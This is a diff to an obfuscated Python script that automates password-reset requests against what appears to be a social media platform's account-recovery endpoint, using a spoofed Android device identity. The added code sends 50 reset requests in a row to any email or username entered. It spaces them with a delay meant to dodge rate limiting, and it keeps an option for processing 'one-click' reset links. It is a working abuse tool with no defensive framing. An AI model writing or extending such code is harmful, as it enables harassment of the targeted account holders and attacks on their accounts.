@@ -3,9 +3,9 @@ import random
 import string
 import uuid
 from datetime import datetime
+import time
 
-
-pas = "mahos99" #Change Your Password Here
+pas = "mahos99"  # Change Your Password Here
 
 def _gDv():
     aid = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
@@ -48,7 +48,8 @@ def _sRst(tag):
         }
         data = {"email_or_username": tag, "flow": "fxcal"}
 
-        return requests.post(url, headers=headers, data=data).json()
+        response = requests.post(url, headers=headers, data=data)
+        return response.json()
 
     except Exception as e:
         return {"ok": False, "error": str(e)}
@@ -134,16 +135,62 @@ def _rLk(reset_link):
         return {"success": False, "error": str(e)}
 
 
+def send_multiple_resets(tag, count=50):
+    """Send multiple reset requests"""
+    results = []
+    
+    print(f"\nStarting to send {count} reset requests for: {tag}")
+    print("-" * 50)
+    
+    for i in range(1, count + 1):
+        try:
+            print(f"\nRequest #{i}:")
+            result = _sRst(tag)
+            
+            # Display response
+            if "ok" in result:
+                print(f"Response: {result}")
+            else:
+                print(f"Response: Error - {result.get('error', 'Unknown error')}")
+            
+            results.append(result)
+            
+            # Add small delay to avoid rate limiting (adjust as needed)
+            if i < count:
+                time.sleep(0.5)
+                
+        except Exception as e:
+            print(f"Request #{i} failed: {str(e)}")
+            results.append({"ok": False, "error": str(e)})
+    
+    print("-" * 50)
+    print(f"\nCompleted {len(results)} requests")
+    
+    # Summary
+    successful = sum(1 for r in results if r.get("ok") == True)
+    failed = len(results) - successful
+    
+    print(f"Successful: {successful}")
+    print(f"Failed: {failed}")
+    
+    return results
+
+
 def main():
     print("Choose Option:")
-    print("[1] Send Reset via Email/Username")
+    print("[1] Send Reset via Email/Username (50 times)")
     print("[2] Reset via ONE-CLICK Link")
 
     choice = input("Enter Option: ")
 
     if choice == "1":
         tg = input("Enter Email or Username: ")
-        print(_sRst(tg))
+        confirm = input(f"Are you sure you want to send 50 reset requests to '{tg}'? (y/n): ")
+        
+        if confirm.lower() == 'y':
+            send_multiple_resets(tg, 50)
+        else:
+            print("Operation cancelled.")
 
     elif choice == "2":
         link = input("Enter Reset Link: ")
@@ -153,4 +200,5 @@ def main():
         print("Invalid Option")
 
 
-main()
+if __name__ == "__main__":
+    main()
